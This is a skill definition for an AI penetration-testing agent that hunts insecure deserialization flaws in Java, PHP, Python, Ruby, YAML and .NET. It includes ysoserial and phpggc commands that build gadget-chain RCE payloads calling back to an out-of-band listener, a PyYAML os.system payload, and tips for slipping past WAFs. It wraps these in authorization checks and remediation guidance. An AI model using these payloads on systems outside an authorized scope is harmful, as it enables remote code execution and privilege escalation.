---
name: deserialization-hunter
description: "Tests inputs that reach deserialization functions (PHP `unserialize`, Java `readObject`, Python `pickle.loads`, Ruby `Marshal.load`, YAML `yaml.load` without safe loader) for insecure deserialization — field tampering for privilege escalation, gadget-chain RCE via known library-sink properties (ysoserial / phpggc), and signature-bypass via HMAC-less payloads. Use when cookies / POST bodies / URL params contain large Base64 / hex blobs with language-specific headers (`rO0` for Java, `O:` for PHP, `\\x80\\x04` for Python pickle). Produces findings with CWE-502 mapping, tampered-blob evidence, and JSON-only + class-allowlist remediation. Defensive testing only — HARMLESS PROBES ONLY, post-RCE halt."
model: opus
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: injection
  authorization_required: true
  tier: T2
  source_methodology: "Guia Técnico de Desserialização Insegura e Metodologia de Testes.md"
  service_affecting: false
  composed_from: []
---

# Deserialization Hunter

## Goal

Test user-controllable inputs that reach deserialization functions
for the family of flaws that lets an attacker tamper object state
(role escalation) or chain library "gadgets" into remote code
execution. This skill implements WSTG-INPV-11 and maps findings to
CWE-502 (Deserialization of Untrusted Data). The goal is to hand
the backend team a concrete list of unsafe deserialization sinks
with tampered-blob evidence and language-specific remediation
(JSON-only, class-allowlist, HMAC integrity).

## When to Use

- Cookies / POST bodies / URL parameters / hidden fields contain
  large Base64 or hex blobs (>50 chars) that decode to structured
  data.
- Blobs start with language-specific serialization headers:
  - Java: `rO0AB` (Base64 of `\xAC\xED\x00\x05` signature)
  - PHP: `O:<N>:"<ClassName>"` (serialized object)
  - Python Pickle: `\x80\x04` or `\x80\x05` (protocol 4 / 5 header)
  - Ruby Marshal: `\x04\x08` (Marshal major + minor)
  - .NET BinaryFormatter: `AAEAAAD` prefix
- YAML endpoints use `yaml.load` (or equivalent) instead of
  `yaml.safe_load`.
- Session state or auth tokens are complex object blobs (not just
  JWTs or random strings).
- The orchestrator selects this skill after `session-flaw-hunter`
  identifies structured-token tampering candidates.

## When NOT to Use

- For JWT-specific issues — use `jwt-hunter`.
- For simple signed-cookie tampering where the cookie is JSON —
  `session-flaw-hunter` Phase 4 covers that.
- For XXE (which is XML deserialization of a sort, but with its
  own methodology) — use `xxe-hunter`.
- For generic SQL / command injection that doesn't flow through
  deserialization — use the specific-class hunter.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist
   or doesn't parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND
   its `testing_level` is `active`.
3. Gadget-chain RCE payloads (ysoserial, phpggc) target specific
   library versions. Use ONLY harmless commands in the final
   payload (`whoami`, `id`, `hostname`, or `curl
   http://{oob_listener}/dsi-poc`). NEVER use payloads that:
   - Spawn reverse shells
   - Drop persistence (cron, ssh keys)
   - Modify state (rm, chmod, DB writes)
   Even with `destructive_testing: approved`.
4. If RCE is confirmed, STOP at the proof. Same post-RCE halt as
   `ssti-hunter` and `command-injection-hunter`. Do not pivot.
5. Gadget-chain payloads are LOUD — they leave distinctive library
   traces in logs. Notify the security team BEFORE Phase 5 (RCE
   probe) so they can distinguish test traffic.
6. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log
   with status `running`. Include the library fingerprint if
   known.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific blob parameters
- `{user_a}`: authenticated session if blobs are session-bound
- `{oob_listener}`: authorized OOB listener URL for blind-RCE
  confirmation

## Methodology

### Phase 1: Blob Inventory and Fingerprinting

1. **Identify encoded-blob inputs** [Bug Bounty Bootcamp, Ch 14, p. 244]

   Do: From captured traffic (`session-flaw-hunter` + `api-recon`
   + manual browsing), find inputs that are:
   - Base64-decoded length > 20 bytes AND decode to non-printable
     or structured bytes
   - Hex-decoded similarly
   - Custom-encoded (URL-encoded with `%` patterns matching
     serialization formats)

   Record: `.claude/planning/{issue}/deserialization-targets.md`
   with (parameter location, decoded first 64 bytes in hex).

2. **Language-signature detection**
   [Bug Bounty Bootcamp, Ch 14, p. 244]

   Do: For each candidate, match the decoded prefix:
   ```
   \xAC\xED\x00\x05       → Java ObjectStream (Base64: rO0AB)
   O:<N>:"<ClassName>":   → PHP serialize()
   \x80\x04 or \x80\x05   → Python Pickle protocol 4/5
   \x04\x08               → Ruby Marshal
   AAEAAAD                → .NET BinaryFormatter (Base64)
   ---\n or !ruby/object  → YAML
   ```

   Vulnerable signal: Match confirms the stack (PHP, Java, etc.) and
   tells you which payload family to use.

   Record: Language + detected-class-name per blob.

### Phase 2: Field Tampering (Non-RCE, Low-Risk First)

3. **Structure parse + field-level modification**
   [Bug Bounty Bootcamp, Ch 14, p. 245]

   Do: Decode the blob. If the format is human-readable enough
   (PHP-serialized, YAML, Python pickle opcodes), identify
   identity / role fields:
   - PHP: `s:5:"admin";b:0;` → flip to `s:5:"admin";b:1;`
   - Python pickle: look for setstate calls modifying `self.role`
   - Ruby Marshal: object vars often decodable

   Re-encode with the length fields updated (for PHP: `s:5:"admin"`
   has length 5 — if you change "admin" to "admin_role", also
   update to `s:10:"admin_role"`).

   Vulnerable response: Server accepts the tampered blob and
   grants the escalated role / identity.

   Not-vulnerable response: Server rejects with signature mismatch,
   integrity-check failure, or generic deserialization error.

   Record: Per-field findings.

4. **Length-field bypass probe**
   [Bug Bounty Bootcamp, Ch 14, p. 245]

   Do: For PHP specifically, test whether the server validates
   length fields against actual content length. Submit
   `s:5:"longer_value"` (length says 5 but string is longer) —
   some PHP versions use this for attacks.

   Record: Per-bypass findings.

### Phase 3: Signature / Integrity Check

5. **HMAC-present check**
   [Bug Bounty Bootcamp, Ch 14]

   Do: Inspect the blob for an appended HMAC (typically the last
   32 or 64 bytes if SHA-256 or SHA-512). Modify one byte of the
   PAYLOAD (not the HMAC) and resubmit.

   Vulnerable response: Server processes the modified payload
   without verifying the HMAC. OR: server doesn't include an HMAC
   at all.

   Not-vulnerable response: Server rejects with "invalid
   signature".

   Record: Per-blob HMAC-presence matrix.

### Phase 4: Library Version Fingerprinting

6. **Version discovery via differential probes**
   [Bug Bounty Bootcamp, Ch 14]

   Do: Probe for library versions (Apache Commons Collections,
   Spring, Struts, etc.) by sending probes that only work on
   specific versions. For Java:
   - Send a blob constructed with `ysoserial CommonsCollections1 <cmd>`
   - If CC1 is on classpath, the gadget chain triggers; otherwise,
     server error
   - Try CC2, CC3, CC4, CC5, CC6, CC7, SpringRCE, etc.
     sequentially with time-delay payloads

   Do: STOP at first version confirmation. Don't enumerate all
   gadgets.

   Record: Library + version + chain that works.

### Phase 5: Harmless-RCE Confirmation (Gated)

7. **Harmless command execution via gadget chain**
   [Bug Bounty Bootcamp, Ch 14, p. 245]

   Do: Use ysoserial / phpggc / python-pickle-generator to craft
   a payload that executes ONLY `whoami` OR a `curl` to the OOB
   listener:
   ```
   # Java
   ysoserial CommonsCollections5 "curl http://{oob_listener}/dsi-poc" \
     | base64 > payload.b64

   # PHP
   phpggc -u Laravel/RCE1 system "curl http://{oob_listener}/dsi-poc" \
     | base64 > payload.b64
   ```

   Submit the payload in the blob location.

   Vulnerable response: Command executes — OOB listener receives
   the callback, or in-band response contains command output.

   Not-vulnerable response: Generic error, no callback, or the
   gadget was patched out.

   Record: FINDING-NNN Critical. STOP — do not escalate.

### Phase 6: YAML-Specific Deserialization

8. **YAML unsafe-load probe**
   [YAML deserialization]

   Do: For endpoints accepting YAML (`Content-Type:
   application/yaml` or `text/yaml`), submit:
   ```yaml
   !!python/object/apply:os.system ["whoami"]
   ```
   (Python PyYAML `yaml.load` without `SafeLoader`)

   Or for Ruby:
   ```yaml
   --- !ruby/object:Gem::Installer
     i: x
   ```

   Vulnerable response: Command executes (Python) or
   deserialization reaches dangerous object (Ruby).

   Not-vulnerable response: Parser uses safe-load; object tags
   rejected.

### Phase 7: .NET-Specific

9. **.NET BinaryFormatter probe**
   [OWASP .NET Deserialization]

   Do: If the blob matches `AAEAAAD` (Base64 prefix of the .NET
   BinaryFormatter magic bytes), use `ysoserial.net` to generate a
   harmless-RCE payload targeting known gadget types
   (ObjectDataProvider, TypeConfuseDelegate).

   Vulnerable response: Command executes.

   Record: FINDING-NNN. Also file recommendation to migrate off
   BinaryFormatter — Microsoft deprecated it entirely.

## Payload Library

Full payloads (generation commands) in `references/payloads.md`.
Categories:

- **Language signatures**: header-byte patterns for detection
- **PHP gadget chains**: phpggc-generated for Laravel, Monolog,
  Drupal, Symfony
- **Java gadget chains**: ysoserial-generated for CommonsCollections
  1-7, Spring, Hibernate1-5, ROME, Click1
- **Python Pickle**: `__reduce__`-based RCE payloads
- **Ruby Marshal**: Gem::Installer chains
- **YAML**: PyYAML + Ruby YAML object-tag payloads
- **.NET BinaryFormatter**: ysoserial.net
  ObjectDataProvider / TypeConfuseDelegate / TextFormattingRunProperties

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per
the schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-502 (Deserialization of Untrusted Data). For
  gadget-chain RCE, add CWE-94 (Code Injection). For field-
  tampering privilege escalation, add CWE-269.
- **OWASP**: WSTG-INPV-11. For APIs, API8:2023 (Security
  Misconfiguration) or A08:2021 (Software and Data Integrity
  Failures) — OWASP Top 10 2021 introduced this explicit category.
- **CVSS vectors**: gadget-chain RCE —
  `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`. Field-tampering
  privilege escalation — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`.
  Signature-bypass alone — `AV:N/AC:L/PR:L/S:U/C:L/I:L/A:N`
  (lower without confirmed escalation path).
- **Evidence**: the original blob (decoded), the tampered blob,
  the response, and for RCE: the OOB listener log + the gadget
  chain used + the library version.
- **Remediation framing**: backend engineer. Include:
  - Migration to JSON with strict schema validation (no
    deserialization of objects — only primitive types)
  - Class allowlist (`LookAheadObjectInputStream` for Java,
    `jsonpickle` with safe mode for Python)
  - HMAC-signed serialized data if deserialization is unavoidable
  - YAML: use `yaml.safe_load` (Python) / `YAML.safe_load` (Ruby)
  - .NET: migrate off BinaryFormatter entirely (Microsoft's
    guidance) — use `System.Text.Json`
  - Library updates (Apache Commons Collections 3.2.2+ removed
    dangerous `InvokerTransformer`; Spring 5.3+ hardened)

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every blob was fingerprinted by language before tampering
- [ ] Field-tampering tests used harmless field changes (role bit,
      not a destructive command)
- [ ] Gadget-chain RCE payloads used `whoami` or OOB callbacks
      only — NOT reverse shells or state-changing commands
- [ ] Post-RCE halt was honored — single confirmation per vuln
- [ ] Security team was notified before Phase 5 RCE probes (or
      scope approved silent runs)
- [ ] The library version / gadget chain is recorded for each
      RCE finding
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Serialization-without-instantiation**: The server stores the
  blob (e.g., in a DB) without ever deserializing it — just
  using it as an opaque identifier. Tampering produces no
  behavior change because no deserialization happens. Confirm
  deserialization actually occurs by checking whether tampered
  fields trigger observable behavior.

- **Gadget on classpath but not reachable**: The target has
  CommonsCollections on the classpath but the particular code
  path doesn't invoke a vulnerable function. The chain triggers
  an error but no execution. Distinguish: a "chain works" means
  command output OR OOB hit; a "chain didn't work" is a silent
  failure.

- **WAF blocks common gadget names**: A WAF blocks
  `java.lang.Runtime.exec` as a string, making an otherwise-
  exploitable target appear safe. Try gadget variants that use
  different Runtime-equivalent chains, or note as "WAF-protected;
  underlying bug remains".

- **Server-side signing that hides the real bug**: The server
  HMAC-signs the blob, so external tampering fails. But if the
  signing key leaks (cross-reference `secrets-in-code-hunter` or
  `crypto-flaw-hunter`), the tampering becomes exploitable.
  File the unsafe deserialization as a finding even if HMAC
  currently blocks exploitation — key compromise is a common
  secondary path.

- **Python pickle on internal queues**: A pickle-deserializing
  worker on an internal queue may be "behind" the web layer — not
  directly reachable by HTTP. However, if the web layer can
  enqueue user-supplied data, it's transitively exploitable.
  File with note on the two-step path.

- **Custom serializer that looks generic**: A company-built
  serializer that mimics PHP's format may not have the same
  gadget chains but can still have type-confusion and
  field-tampering issues. Note as "custom serializer —
  methodology adapted" and flag for manual review.

## References

- `references/payloads.md` — ysoserial / phpggc / manual payload
  catalog per language
- `references/remediation.md` — language-specific safe-
  deserialization snippets

External:
- WSTG-INPV-11: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection
- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- OWASP Deserialization Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- ysoserial: https://github.com/frohoff/ysoserial
- phpggc: https://github.com/ambionics/phpggc

## Source Methodology

Converted from:
`pentest-agent-development/notebooklm-notes/Guia Técnico de Desserialização Insegura e Metodologia de Testes.md`

Grounded in:
- Bug Bounty Bootcamp, Ch 14 (Insecure Deserialization)
- The Web Application Hacker's Handbook, Ch 19
- The Tangled Web, Ch 13

Conversion date: 2026-04-24
Conversion prompt version: 1.0
